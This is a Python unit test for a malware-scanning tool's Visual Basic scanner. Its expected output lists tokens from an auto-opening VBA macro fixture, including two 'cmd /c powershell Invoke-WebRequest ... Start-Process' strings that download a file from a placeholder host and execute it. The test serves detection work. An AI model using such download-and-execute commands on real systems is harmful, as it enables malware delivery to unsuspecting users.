from strelka.testing import (
    File,
    Scanner,
    fixtures,
    make_event,
    make_indicator,
    run_test_scan,
)


scan_vb = fixtures.scanners.vb
data_vba = fixtures.data("test.vba")


def test_scan_vb(
    scan_vb: Scanner,
    data_vba: File,
) -> None:
    """
    Pass:   Sample event matches output of scanner.
    Fail:   Sample event fails to match.
    """
    test_event = make_event(
        related=[
            make_indicator("domain-name", "www.test.com"),
            make_indicator("domain-name", "www.test.example.com"),
            make_indicator("url", "https://www.test.com/test.bat"),
            make_indicator("url", "https://www.test.example.com"),
        ],
        scan={
            "script_length_bytes": 752,
            "token_types": [
                "Strelka.Url",
                "Token.Comment",
                "Token.Keyword",
                "Token.Literal.Number.Integer",
                "Token.Literal.String",
                "Token.Name",
                "Token.Name.Function",
                "Token.Operator",
                "Token.Punctuation",
                "Token.Text.Whitespace",
            ],
            "tokens": {
                "comments": [
                    r"AutoOpen Macro",
                ],
                "functions": [
                    r"AutoOpen",
                    r"Document_Open",
                    r"Testing_Iocs",
                ],
                "names": [
                    r"Explicit",
                    r"MsgBox",
                    r"objWMIService",
                    r"GetObject",
                    r"objStartup",
                    r"Get",
                    r"objConfig",
                    r"SpawnInstance_",
                    r"ShowWindow",
                    r"objProcess",
                    r"ExecuteCmdAsync",
                ],
                "operators": ["="],
                "strings": [
                    r"Hello World!",
                    r"winmgmts:\\\\.\\root\\cimv2",
                    r"Win32_ProcessStartup",
                    r"winmgmts:\\\\.\\root\\cimv2:Win32_Process",
                    (
                        r"cmd /c powershell Invoke-WebRequest -Uri https://www.test.exa"
                        r"mple.com -OutFile $env:tmp\\test.txt\nStart-Process -Filepath"
                        r" $env:tmp\\invoice.one"
                    ),
                    (
                        r"cmd /c powershell Invoke-WebRequest -Uri https://www.test.com"
                        r"/test.bat -OutFile $env:tmp\\test.bat\nStart-Process -Filepat"
                        r"h $env:tmp\\test.bat"
                    ),
                ],
                "urls": [
                    r"https://www.test.example.com",
                    r"https://www.test.com/test.bat",
                ],
            },
        },
    )
    run_test_scan(
        scanner=scan_vb,
        fixture=data_vba,
        expected=test_event,
    )
